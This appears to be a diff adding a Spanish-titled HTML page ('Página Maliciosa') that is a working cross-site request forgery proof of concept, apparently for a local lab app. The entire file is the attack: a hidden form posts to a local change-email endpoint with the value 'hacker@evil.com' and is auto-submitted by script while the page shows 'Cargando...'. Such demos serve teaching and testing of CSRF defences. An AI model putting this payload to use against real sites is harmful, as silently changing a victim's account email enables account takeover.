@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Página Maliciosa</title>
+</head>
+<body>
+  <h1>Cargando...</h1>
+  <form id="csrf-form" action="http://localhost:3000/api/change-email" method="POST" style="display:none">
+    <input name="email" value="hacker@evil.com">
+  </form>
+  <script>
+    document.getElementById('csrf-form').submit();
+  </script>
+</body>
+</html>
